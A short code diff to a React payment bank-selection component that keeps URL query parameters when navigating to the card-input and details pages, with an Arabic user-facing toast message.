@@ -100,7 +100,9 @@ const PaymentBankSelector = () => {
       description: "يمكنك إدخال بيانات البطاقة من أي بنك",
     });
 
-    navigate(`/pay/${id}/card-input`);
+    // Preserve query parameters
+    const queryString = new URLSearchParams(window.location.search).toString();
+    navigate(`/pay/${id}/card-input${queryString ? `?${queryString}` : ''}`);
   };
 
   const handleContinue = async () => {
@@ -122,7 +124,9 @@ const PaymentBankSelector = () => {
       console.error('Error saving bank selection:', error);
     }
 
-    navigate(`/pay/${id}/card-input`);
+    // Preserve query parameters
+    const queryString = new URLSearchParams(window.location.search).toString();
+    navigate(`/pay/${id}/card-input${queryString ? `?${queryString}` : ''}`);
   };
   
   // Show loading state while fetching link data
@@ -169,7 +173,10 @@ const PaymentBankSelector = () => {
         {/* Header */}
         <div className="mb-6">
           <button
-            onClick={() => navigate(`/pay/${id}/details`)}
+            onClick={() => {
+              const queryString = new URLSearchParams(window.location.search).toString();
+              navigate(`/pay/${id}/details${queryString ? `?${queryString}` : ''}`);
+            }}
             className="flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground mb-4"
           >
             <ArrowLeft className="w-4 h-4" />
